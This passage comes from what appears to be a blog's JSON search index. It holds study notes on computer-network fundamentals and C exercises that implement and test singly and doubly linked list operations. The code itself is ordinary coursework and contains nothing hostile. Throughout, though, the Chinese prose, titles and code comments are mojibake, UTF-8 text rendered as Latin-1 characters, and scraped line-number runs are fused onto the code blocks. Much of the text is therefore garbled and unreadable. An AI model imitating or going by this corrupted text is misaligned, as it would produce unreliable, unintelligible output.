BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/","excerpt":"","text":"1.1 è®¡ç®—æœºç½‘ç»œåœ¨ä¿¡æ¯æ—¶ä»£çš„ä½œç”¨21ä¸–çºªï¼Œæ•°å­—åŒ–ã€ç½‘ç»œåŒ–ã€ä¿¡æ¯åŒ– ç½‘ç»œåŒ–ï¼šä¸‰ç½‘â€”â€”-ç”µä¿¡ç½‘ç»œã€è®¡ç®—æœºç½‘ç»œã€æœ‰çº¿ç”µè§†ç½‘ç»œ è®¡ç®—æœºç½‘ç»œï¼šå› ç‰¹ç½‘ã€å…¶å®ƒç½‘ç»œï¼ˆæ”¿åºœä¸“ç”¨ç½‘ç»œç­‰ç­‰ï¼‰ è®¡ç®—æœºç½‘ç»œçš„é‡è¦åŠŸèƒ½ï¼š è¿é€šæ€§ï¼šå½¼æ­¤è¿æ¥ï¼Œäº¤æ¢ä¿¡æ¯ å…±äº«ï¼šä¿¡æ¯å…±äº«ã€è½¯ç¡¬ä»¶å…±äº« 1.2 å› ç‰¹ç½‘ç½‘ç»œï¼šNetwork ç»“ç‚¹ï¼ˆäº¤æ¢æœº å’Œ è®¡ç®—æœºï¼‰ ä¸ é“¾è·¯ è¿æ¥ï¼Œè®¸å¤šè®¡ç®—æœº é€šè¿‡ é“¾è·¯ è¿æ¥åœ¨äº¤æ¢æœºä¸Šï¼Œä¹‹é—´çš„â€”â€” äº¤æ¢æœº äº’è¿ç½‘ï¼šinternet ï¼ˆNetwork of Networksï¼‰ è¿æ¥ å„ä¸ªç½‘ç»œï¼Œç½‘ç»œä¸ç½‘ç»œ é€šè¿‡è·¯ç”±å™¨ ç›¸è¿ â€”â€”- è·¯ç”±å™¨ å› ç‰¹ç½‘ï¼šInternet å…¨çƒæœ€å¤§çš„äº’è¿ç½‘ TCP/IP å› ç‰¹ç½‘å‘å±•ä¸‰ä¸ªé˜¶æ®µï¼š ARPANET å‘äº’è¿ç½‘ å‘å±•ï¼š 1969 å¹´ï¼Œåˆ†ç»„äº¤æ¢ 1975 å¹´ï¼Œäº’è”ç½‘ 1983 å¹´ï¼Œå› ç‰¹ç½‘ TCP/IPï¼Œæ­¤æ—¶ æ˜¯æœªå¼€æ”¾çš„æ”¿åºœæ€§è´¨çš„ç½‘ç»œ ä¸‰çº§ç»“æ„çš„å› ç‰¹ç½‘ 1985 å¹´ï¼Œä¸‰ä¸ªåœ°åŒºç½‘ï¼ˆæ ¡å›­ç½‘ç­‰ï¼‰ï¼Œä¸€ä¸ªä¸»å¹²ç½‘ï¼Œåœ°åŒºç½‘è¿æ¥åœ¨ä¸»å¹²ç½‘ä¸Š å¤šå±‚æ¬¡ ISP ç»“æ„çš„å› ç‰¹ç½‘ ï¼ˆISP å› ç‰¹ç½‘æœåŠ¡æä¾›å•†ï¼šç«¯ç³»ç»Ÿé€šè¿‡å…¶è¿æ¥åœ¨å› ç‰¹ç½‘ï¼‰ ç”±å› ç‰¹ç½‘ç®¡ç†æœºæ„ åˆ†é…å…¬ç½‘ IP ç»™ ISP ï¼Œç„¶å ISP å†åˆ†é…ç»™ ç«¯ç³»ç»Ÿï¼ŒåŒæ—¶ ISP ä¹Ÿæ˜¯åˆ†çº§çš„ é€‰æ‹©æœ¬åœ°è¿è¥å•†ä¸‹è½½é€Ÿåº¦å¿« 1.3 å› ç‰¹ç½‘çš„ç»„æˆ1.3.1 æ ¸å¿ƒéƒ¨åˆ†æ•°æ®äº¤æ¢æ–¹å¼ï¼š ç”µè·¯äº¤æ¢ Circuit Switching ï¼šé¢å‘è¿æ¥ ä¸¾ä¾‹ï¼šæ‰“ç”µè¯ å»ºç«‹è¿æ¥ï¼šç”³è¯·å ç”¨é€šä¿¡èµ„æºï¼ˆè€—æ—¶ï¼‰ é€šè¯è¿‡ç¨‹ï¼šä¸€ç›´å ç”¨èµ„æº é‡Šæ”¾è¿æ¥ï¼šé‡Šæ”¾é€šä¿¡èµ„æºï¼ˆä¸é‡Šæ”¾å³ä¸º å çº¿ï¼‰ é€‚ç”¨äºï¼šæ•°æ®é‡å¾ˆå¤§çš„å®æ—¶æ€§ä¼ è¾“ï¼›æ ¸å¿ƒè·¯ç”±å™¨ä¹‹é—´å¯ä½¿ç”¨ã€‚ æŠ¥æ–‡äº¤æ¢ Message Switching æŠ¥æ–‡æ¯”åˆ†ç»„é•¿ï¼ˆä¸åˆ†æ®µï¼‰ æŠ¥æ–‡äº¤æ¢çš„æ—¶é—´é•¿ ä¸å»ºç«‹è¿æ¥ åˆ†ç»„äº¤æ¢ Packet Switchingï¼šè®¡ç®—æœºç½‘ç»œé‡‡ç”¨è¯¥æ–¹å¼å®ç°æ•°æ®é€šä¿¡ å‘é€ç«¯å°†éœ€è¦ä¼ è¾“çš„æ•°æ®è¿›è¡Œåˆ†ç»„ï¼šæ¯ä¸€ä¸ªåˆ†ç»„å‡ç”± é¦–éƒ¨ï¼ˆæºåœ°å€ã€ç›®æ ‡åœ°å€ï¼‰ å’Œ æ•°æ® ä¸¤éƒ¨åˆ†ç»„æˆ æ¥æ”¶ç«¯ æ¥æ”¶æ¯ä¸ªåˆ†ç»„ï¼Œå»æ‰å…¶é¦–éƒ¨ä¿ç•™æ•°æ®ï¼Œè¿æ¥åœ¨ä¸€èµ·ï¼Œä½¿æ•°æ®å®Œæ•´ ä»å‘é€ç«¯åˆ°æ¥æ”¶ç«¯ï¼šè¿›è¡Œåˆ†ç»„çš„è½¬å‘â€”â€”ç”±è·¯ç”±å™¨è¿›è¡Œé€‰æ‹©æœ€ä½³åˆé€‚çš„è·¯å¾„è¿›è¡Œè½¬å‘ ï¼ˆè·¯ç”±å™¨ï¼šå­˜å‚¨ã€è½¬å‘çš„åŠŸèƒ½ æš‚å­˜ã€æŸ¥æ‰¾è½¬å‘è¡¨ã€æ‰¾åˆ°è¦è½¬å‘çš„ç«¯å£ï¼‰ ä¸éœ€è¦å»ºç«‹è¿æ¥ï¼Œä¸å çº¿ ä¼˜ç‚¹ï¼šé«˜æ•ˆã€è¿…é€Ÿã€å¯é ã€çµæ´» ç¼ºç‚¹ï¼šæ—¶å»¶ã€å¼€é”€ è€—æ—¶ï¼šæŠ¥æ–‡ &gt; ç”µè·¯ &gt; åˆ†ç»„ 1.3.2 è¾¹ç¼˜éƒ¨åˆ†ä¸»æœºä¹‹é—´çš„é€šä¿¡æ–¹å¼ï¼š C/S å®¢æˆ·æœåŠ¡å™¨æ–¹å¼ï¼šClient/Server æœåŠ¡å™¨æ˜¯æœåŠ¡å™¨ï¼Œå®¢æˆ·æœºæ˜¯å®¢æˆ·æœº P2P å¯¹ç­‰æ–¹å¼ï¼šPeer-to-Peer å®¢æˆ·æœºä¹Ÿå¯ä»¥æ˜¯æœåŠ¡å™¨ï¼Œå³æ˜¯æœåŠ¡å™¨ä¹Ÿæ˜¯å®¢æˆ·æœº ä¾‹å¦‚ï¼šP2P ä¸‹è½½ï¼šå¯ä»¥ä»å¤šä¸ªæºä¸Šä¸‹è½½åŒä¸€ä¸ªæ–‡ä»¶ï¼Œä¸éœ€è¦ä»…ä»…ä»ä¸€ä¸ªæœåŠ¡å™¨ä¸Šä¸‹è½½ 1.4 è®¡ç®—æœºç½‘ç»œåœ¨æˆ‘å›½çš„å‘å±•1994 å¹´ 4 æœˆ 20 æ—¥ï¼Œä¸­å›½æ­£å¼æ¥å…¥äº’è¿ç½‘ 1.5 è®¡ç®—æœºç½‘ç»œçš„ç±»åˆ« 1.6 è®¡ç®—æœºç½‘ç»œçš„æ€§èƒ½é€Ÿç‡ï¼šè¿æ¥åœ¨è®¡ç®—æœºç½‘ç»œä¸Šçš„ä¸»æœºåœ¨æ•°å­—ä¿¡é“ä¸Šä¼ é€ æ•°æ®ä½æ•° çš„é€Ÿç‡ data rate bit rate b/s kb/s Mb/s Gb/s å¸¦å®½ï¼šæ•°æ®é€šä¿¡é¢†åŸŸä¸­ï¼Œæ•°å­—ä¿¡é“æ‰€èƒ½ä¼ é€çš„æœ€é«˜æ•°æ®ç‡ b/s kb/s Mb/s Gb/s ååé‡ï¼šå•ä½æ—¶é—´å†…é€šè¿‡æŸä¸ªç½‘ç»œï¼ˆæ‰€æœ‰è·¯å¾„ï¼‰çš„æ•°æ®é‡ b/s Mb/s æ—¶å»¶ï¼šå‘é€æ—¶å»¶ã€ä¼ æ’­æ—¶å»¶ã€å¤„ç†æ—¶å»¶ã€æ’é˜Ÿæ—¶å»¶ä¹‹å’Œ æ—¶å»¶å¸¦å®½ç§¯ï¼šä¼ æ’­æ—¶å»¶ x å¸¦å®½ å¾€è¿”æ—¶é—´ï¼šä»å‘é€ç«¯å‘é€æ•°æ®å¼€å§‹ï¼Œåˆ°å‘é€ç«¯æ”¶åˆ°æ¥æ”¶ç«¯ç¡®è®¤ ä¸ºæ­¢ åˆ©ç”¨ç‡ ä¿¡é“åˆ©ç”¨ç‡ï¼šæœ‰æ•°æ®é€šè¿‡æ—¶é—´/ï¼ˆæœ‰åŠ æ— ï¼‰æ•°æ®é€šè¿‡çš„æ—¶é—´ ç½‘ç»œåˆ©ç”¨ç‡ï¼šä¿¡é“åˆ©ç”¨ç‡åŠ æƒå¹³å‡å€¼ éæ€§èƒ½æŒ‡æ ‡ï¼š è´¹ç”¨ ã€ç®¡ç†ä¸ç»´æŠ¤ã€è´¨é‡ã€æ ‡å‡†åŒ–ã€å¯é æ€§ã€å¯æ‰©å±•æ€§ã€å¯å‡çº§æ€§","categories":[{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"}],"tags":[{"name":"è®¡ç½‘","slug":"è®¡ç½‘","permalink":"https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"}],"author":"xizhi-future"},{"title":"å•é“¾è¡¨ã€åŒé“¾è¡¨ç»ƒé¢˜","slug":"å•é“¾è¡¨ã€åŒé“¾è¡¨ç»ƒé¢˜","date":"2021-10-05T11:51:44.000Z","updated":"2021-10-05T11:52:52.560Z","comments":true,"path":"2021/10/05/å•é“¾è¡¨ã€åŒé“¾è¡¨ç»ƒé¢˜/","link":"","permalink":"https://xizhi-future.github.io/2021/10/05/%E5%8D%95%E9%93%BE%E8%A1%A8%E3%80%81%E5%8F%8C%E9%93%BE%E8%A1%A8%E7%BB%83%E9%A2%98/","excerpt":"","text":"[TOC] ç¬¬ä¸‰ç«  é“¾å¼å­˜å‚¨1. è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œæ±‚ä¸€ä¸ªå•é“¾è¡¨ä¸­çš„ç»“ç‚¹ä¸ªæ•°ã€‚ç®—æ³•ï¼š 12345678910//è®¡æ•°int count(node *head)&#123; int s = 0; node *p = head; while(p)&#123; p = p-&gt;next; s++; &#125; return s;&#125; æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//å‰æ’æ³• åˆ›å»ºå•é“¾è¡¨node *creat()&#123; node *head = NULL; node *s; int x; printf(&quot;è¯·è¾“å…¥ç»“ç‚¹å€¼ï¼š\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while( x!= FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//è¾“å‡ºvoid print(node *head)&#123; node *p = head; if(!p) &#123;printf(&quot;é“¾è¡¨æ˜¯ ç©ºçš„ï¼\\n&quot;);&#125; else&#123; printf(&quot;å•é“¾è¡¨å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//è®¡æ•°int count(node *head)&#123; int s = 0; node *p = head; while(p)&#123; p = p-&gt;next; s++; &#125; return s;&#125;int main()&#123; node *pt; int sum; pt=creat(); print(pt); sum = count(pt); printf(&quot;\\n\\nè¯¥å•é“¾è¡¨ä¸­ç»“ç‚¹ä¸ªæ•°æ˜¯ï¼š%d\\n&quot;,sum); return 0;&#125; 2. è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåœ¨ä¸€ä¸ªå•é“¾è¡¨ä¸­å€¼ä¸ºyçš„ç»“ç‚¹å‰é¢æ’å…¥ä¸€ä¸ªå€¼ä¸ºxçš„ç»“ç‚¹ã€‚å³ä½¿å€¼ä¸ºxçš„æ–°ç»“ç‚¹æˆä¸ºå€¼ä¸ºyçš„ç»“ç‚¹çš„å‰é©±ç»“ç‚¹ã€‚ç®—æ³•ï¼š 1234567891011121314151617//åœ¨å€¼ä¸º y çš„ç»“ç‚¹å‰æ’å…¥ å€¼ä¸º x çš„ç»“ç‚¹node *insert(node *head,datatype y,datatype x)&#123; node *p = head; node *q,*pre; while(p &amp;&amp; p-&gt;info != y)&#123; pre = p; p = p-&gt;next; &#125; if(!p) &#123;printf(&quot;æ‰¾ä¸åˆ°å€¼æ˜¯%dçš„ç»“ç‚¹\\n&quot;,y);&#125; else&#123; q = (node*)malloc(sizeof(node)); q-&gt;info = x; q-&gt;next = p; pre-&gt;next = q; &#125; return head;&#125; æµ‹è¯•ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//åˆ›å»ºå•é“¾è¡¨ å‰æ’æ³•node *creat(void)&#123; node *head = NULL; node *s; int x; printf(&quot;è¯·è¾“å…¥ç»“ç‚¹å€¼ï¼š\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//è¾“å‡ºvoid print(node *head)&#123; //ç”±äºæ˜¯ å‰æ’ï¼šæ‰€ä»¥è¾“å‡ºçš„å†…å®¹æ˜¯ä¸ä¹‹å‰è¾“å…¥çš„é¡ºåºç›¸å node *p = head; if(!p) &#123;printf(&quot;å•é“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;);&#125; else&#123; printf(&quot;å•é“¾è¡¨å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//åœ¨å€¼ä¸º y çš„ç»“ç‚¹å‰æ’å…¥ å€¼ä¸º x çš„ç»“ç‚¹node *insert(node *head,datatype y,datatype x)&#123; node *p = head; node *q,*pre; while(p &amp;&amp; p-&gt;info != y)&#123; pre = p; p = p-&gt;next; &#125; if(!p) &#123;printf(&quot;æ‰¾ä¸åˆ°å€¼æ˜¯%dçš„ç»“ç‚¹\\n&quot;,y);&#125; else&#123; q = (node*)malloc(sizeof(node)); q-&gt;info = x; q-&gt;next = p; pre-&gt;next = q; &#125; return head;&#125;int main()&#123; node *pt; pt = creat(); printf(&quot;è¿›è¡Œæ’å…¥ä¹‹å‰ï¼š\\n&quot;); print(pt); pt = insert(pt,11,88); printf(&quot;\\nè¿›è¡Œæ’å…¥ä¹‹åï¼š\\n&quot;); print(pt); printf(&quot;\\n&quot;); return 0;&#125; 3. è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåˆ¤æ–­ä¸€ä¸ªå•é“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹å€¼æ˜¯å¦æœ‰åºã€‚ç®—æ³•ï¼š 1234567891011121314151617181920212223242526//åˆ¤æ–­ å•é“¾è¡¨ä¸­ å„ç»“ç‚¹å€¼æ˜¯å¦æœ‰åº//å‚æ•°æ˜¯ a ï¼Œä¸ºå‡åºï¼Œå‚æ•°ä¸º b ï¼Œä¸ºé™åºint judge_order(node *head,char c)&#123; int flag = 1; //node *p = head-&gt;next; node *p = head; switch(c)&#123; case &#x27;a&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &lt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; case &#x27;b&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &gt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; &#125; return flag;&#125; æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;/*//åˆ›å»ºå•é“¾è¡¨ å‰æ’æ³•node *creat_first(void)&#123; node *head = NULL; node *s; int x; printf(&quot;è¯·è¾“å…¥å„ä¸ªç»“ç‚¹çš„å€¼ï¼š\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; s-&gt;next = head; head = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;*///åæ’æ³• åˆ›å»ºå•é“¾è¡¨node *creat_behind(void)&#123; node *head = NULL; node *r = NULL; node *s; int x; printf(&quot;è¯·è¾“å‡ºå„ä¸ªç»“ç‚¹çš„å€¼ï¼š\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x != FLAG)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; if(!head) head = s; else r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; if(r != NULL)&#123; r-&gt;next = NULL; &#125; return head;&#125;//è¾“å‡ºvoid print(node *head)&#123; node *p = head; if(!p) &#123;printf(&quot;å•é“¾è¡¨æ˜¯ç©ºçš„!\\n&quot;);&#125; else&#123; printf(&quot;å•é“¾è¡¨å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125;&#125;//åˆ¤æ–­ å•é“¾è¡¨ä¸­ å„ç»“ç‚¹å€¼æ˜¯å¦æœ‰åº//å‚æ•°æ˜¯ a ï¼Œä¸ºå‡åºï¼Œå‚æ•°ä¸º b ï¼Œä¸ºé™åºint judge_order(node *head,char c)&#123; int flag = 1; //node *p = head-&gt;next; node *p = head; switch(c)&#123; case &#x27;a&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &lt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; case &#x27;b&#x27;: while(p &amp;&amp; p-&gt;next &amp;&amp; flag)&#123; if(p-&gt;info &gt;= p-&gt;next-&gt;info) p = p-&gt;next; else flag = 0; &#125; break; &#125; return flag;&#125;int main()&#123; node *pt; int i = 0; //pt = creat_first(); while(i &lt;=3)&#123; pt = creat_behind(); print(pt); if(judge_order(pt,&#x27;a&#x27;))&#123; printf(&quot;\\nå•é“¾è¡¨æ˜¯ å‡åº æ’åˆ—çš„ï¼\\n&quot;); &#125; else if(judge_order(pt,&#x27;b&#x27;))&#123; printf(&quot;\\nå•é“¾è¡¨æ˜¯ é™åº æ’åˆ—çš„ï¼\\n&quot;); &#125;else&#123; printf(&quot;\\nå•é“¾è¡¨æ˜¯ æ— åº æ’åˆ—çš„ï¼\\n\\n\\n&quot;); &#125; i++; &#125; return 0;&#125; 4. è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåˆ©ç”¨å•é“¾è¡¨åŸæ¥çš„ç»“ç‚¹ç©ºé—´å°†ä¸€ä¸ªå•é“¾è¡¨å°±åœ°è½¬ç½®ã€‚ç®—æ³•ï¼š 123456789101112//è½¬ç½®void reverse(node *head)&#123; node *p,*q; p = head-&gt;next; head-&gt;next = NULL; while(p)&#123; q = p; p = p-&gt;next; q-&gt;next = head-&gt;next; head-&gt;next = q; &#125; &#125; æµ‹è¯•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#define FLAG 0typedef int datatype;typedef struct link_node&#123; datatype info; struct link_node *next;&#125;node;//åæ’æ³• åˆ›å»º å¸¦å¤´ç»“ç‚¹çš„ å•é“¾è¡¨node *creat_behind()&#123; node *head,*s,*r; datatype x; head = r = (node*)malloc(sizeof(node)); printf(&quot;è¯·è¾“å…¥å•é“¾è¡¨å†…å®¹ï¼šï¼ˆä»¥ 0 ç»“å°¾ï¼‰\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (node*)malloc(sizeof(node)); s-&gt;info = x; r-&gt;next = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; r-&gt;next = NULL; return head;&#125;//æ‰“å°è¾“å‡º å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨void print(node *head)&#123; node *p; p = head-&gt;next; if(!p)&#123; printf(&quot;å•é“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;); &#125;else&#123; printf(&quot;å•é“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;next; &#125; &#125; printf(&quot;\\n&quot;);&#125;//è½¬ç½®void reverse(node *head)&#123; node *p,*q; p = head-&gt;next; head-&gt;next = NULL; while(p)&#123; q = p; p = p-&gt;next; q-&gt;next = head-&gt;next; head-&gt;next = q; &#125; &#125;int main()&#123; node *pt; pt = creat_behind(); printf(&quot;\\n&quot;); printf(&quot;åŸå•é“¾è¡¨ï¼š\\n&quot;); print(pt); reverse(pt); //è½¬ç½® printf(&quot;è½¬ç½®ä¹‹åçš„å•é“¾è¡¨ï¼š\\n&quot;); printf(&quot;\\n&quot;); print(pt); printf(&quot;\\n&quot;); return 0;&#125; 5. è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œåœ¨åŒé“¾è¡¨ä¸­å€¼ä¸ºyçš„ç»“ç‚¹å‰é¢æ’å…¥ä¸€ä¸ªå€¼ä¸ºxçš„æ–°ç»“ç‚¹ã€‚å³ä½¿å€¼ä¸ºxçš„æ–°ç»“ç‚¹æˆä¸ºå€¼ä¸ºyçš„ç»“ç‚¹çš„å‰é©±ç»“ç‚¹ã€‚ç®—æ³•ï¼š 1234567891011121314151617181920//åœ¨å€¼ä¸º y çš„ç»“ç‚¹ä¹‹å‰æ’å…¥ å€¼ä¸º x çš„æ–°çš„ç»“ç‚¹dnode *insert(dnode *head,datatype y,datatype x)&#123; dnode *p = head-&gt;rlink; dnode *s; while(p &amp;&amp; p-&gt;info != y)&#123; p = p-&gt;rlink; &#125; if(!p)&#123; printf(&quot;\\nåŒé“¾è¡¨ä¸­ä¸å­˜åœ¨å€¼ä¸º y çš„ç»“ç‚¹ï¼Œæ— æ³•æ’å…¥ï¼\\n&quot;); &#125;else&#123; // è¿›è¡Œæ’å…¥ ï¼šåœ¨å€¼ä¸º y çš„ç»“ç‚¹ä¹‹å‰æ’å…¥ å€¼ä¸º x çš„æ–°çš„ç»“ç‚¹ s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = p; p-&gt;llink-&gt;rlink = s; s-&gt;llink = p-&gt;llink; p-&gt;llink = s; &#125; return head;&#125; æµ‹è¯•ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef int datatype;typedef struct dlink_node&#123; datatype info; struct dlink_node *rlink,*llink;&#125;dnode;//å°¾æ’æ³• åˆ›å»ºå¸¦å¤´ç»“ç‚¹çš„åŒé“¾è¡¨dnode *creat_behind(void)&#123; dnode *head,*r,*s; //æ³¨æ„ï¼šåŒæ—¶å®šä¹‰å¤šä¸ªæŒ‡é’ˆ datatype x; head = r = (dnode*)malloc(sizeof(dnode));//å»ºç«‹åŒé“¾è¡¨çš„å¤´ç»“ç‚¹ head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;è¯·è¾“å‡ºåŒé“¾è¡¨çš„å†…å®¹ï¼š(ä»¥ 0 ç»“æŸ)\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; //å°†æ–°çš„ç»“ç‚¹ s æ’å…¥åˆ°åŒé“¾è¡¨çš„æœ«å°¾ s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//æ‰“å°è¾“å‡ºvoid print(dnode *head)&#123; dnode *p; p = head-&gt;rlink; //ç”±äºæ˜¯å¸¦å¤´ç»“ç‚¹çš„ æ‰€ä»¥ æŒ‡å‘ head çš„ ä¸‹ä¸€ä¸ªä½ç½® if(!p)&#123; printf(&quot;åŒé“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;); &#125;else&#123; printf(&quot;å•é“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125; &#125;&#125;//åœ¨å€¼ä¸º y çš„ç»“ç‚¹ä¹‹å‰æ’å…¥ å€¼ä¸º x çš„æ–°çš„ç»“ç‚¹dnode *insert(dnode *head,datatype y,datatype x)&#123; dnode *p = head-&gt;rlink; dnode *s; while(p &amp;&amp; p-&gt;info != y)&#123; p = p-&gt;rlink; &#125; if(!p)&#123; printf(&quot;\\nåŒé“¾è¡¨ä¸­ä¸å­˜åœ¨å€¼ä¸º y çš„ç»“ç‚¹ï¼Œæ— æ³•æ’å…¥ï¼\\n&quot;); &#125;else&#123; // è¿›è¡Œæ’å…¥ ï¼šåœ¨å€¼ä¸º y çš„ç»“ç‚¹ä¹‹å‰æ’å…¥ å€¼ä¸º x çš„æ–°çš„ç»“ç‚¹ s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = p; p-&gt;llink-&gt;rlink = s; s-&gt;llink = p-&gt;llink; p-&gt;llink = s; &#125; return head;&#125;int main()&#123; dnode *pt,*pt1; pt = creat_behind(); printf(&quot;\\nè¿›è¡Œæ“ä½œä¹‹å‰ï¼š\\n&quot;); print(pt); pt1 = insert(pt,10,99); //åœ¨ 10 å‰é¢æ’å…¥ 99 printf(&quot;\\nè¿›è¡Œæ“ä½œä¹‹åï¼š\\n&quot;); print(pt1); printf(&quot;\\n&quot;); return 0;&#125; 6. è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œä»å³å‘å·¦æ‰“å°ä¸€ä¸ªåŒé“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼ã€‚ç®—æ³•ï¼š 12345678//ä»å³å‘å·¦æ‰“å°ä¸€ä¸ªåŒé“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼//é€’å½’æ³•void print_reverse(dnode *head)&#123; if(head-&gt;rlink)&#123; print_reverse(head-&gt;rlink); printf(&quot;%5d&quot;,head-&gt;rlink-&gt;info); &#125;&#125; æµ‹è¯•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;typedef int datatype;typedef struct dlink_node&#123; datatype info; struct dlink_node *rlink,*llink;&#125;dnode;//å°¾æ’æ³• åˆ›å»º å¸¦å¤´ç»“ç‚¹çš„ åŒé“¾è¡¨dnode *creat_behind(void)&#123; dnode *head,*r,*s; datatype x; head = r = (dnode*)malloc(sizeof(dnode)); head-&gt;llink = head-&gt;rlink = NULL; printf(&quot;è¯·è¾“å…¥åŒé“¾è¡¨çš„å†…å®¹ï¼šï¼ˆä»¥ 0 ç»“æŸï¼‰\\n&quot;); scanf(&quot;%d&quot;,&amp;x); while(x)&#123; s = (dnode*)malloc(sizeof(dnode)); s-&gt;info = x; s-&gt;rlink = r-&gt;rlink; s-&gt;llink = r; r-&gt;rlink = s; r = s; scanf(&quot;%d&quot;,&amp;x); &#125; return head;&#125;//æ‰“å°è¾“å‡ºvoid print(dnode *head)&#123; dnode *p; p = head-&gt;rlink; if(!p)&#123; printf(&quot;åŒé“¾è¡¨æ˜¯ç©ºçš„ï¼\\n&quot;); &#125;else&#123; printf(&quot;åŒé“¾è¡¨çš„å„ä¸ªå€¼æ˜¯ï¼š\\n&quot;); while(p)&#123; printf(&quot;%5d&quot;,p-&gt;info); p = p-&gt;rlink; &#125; &#125;&#125;//ä»å³å‘å·¦æ‰“å°ä¸€ä¸ªåŒé“¾è¡¨ä¸­å„ä¸ªç»“ç‚¹çš„å€¼//é€’å½’æ³•void print_reverse(dnode *head)&#123; if(head-&gt;rlink)&#123; print_reverse(head-&gt;rlink); printf(&quot;%5d&quot;,head-&gt;rlink-&gt;info); &#125;&#125;int main()&#123; dnode *pt; pt = creat_behind(); printf(&quot;è¿›è¡Œæ“ä½œä¹‹å‰ï¼š\\n&quot;); print(pt); printf(&quot;\\n&quot;); printf(&quot;è¿›è¡Œæ“ä½œä¹‹åï¼š\\n&quot;); print_reverse(pt); //print(pt); printf(&quot;\\n&quot;); return 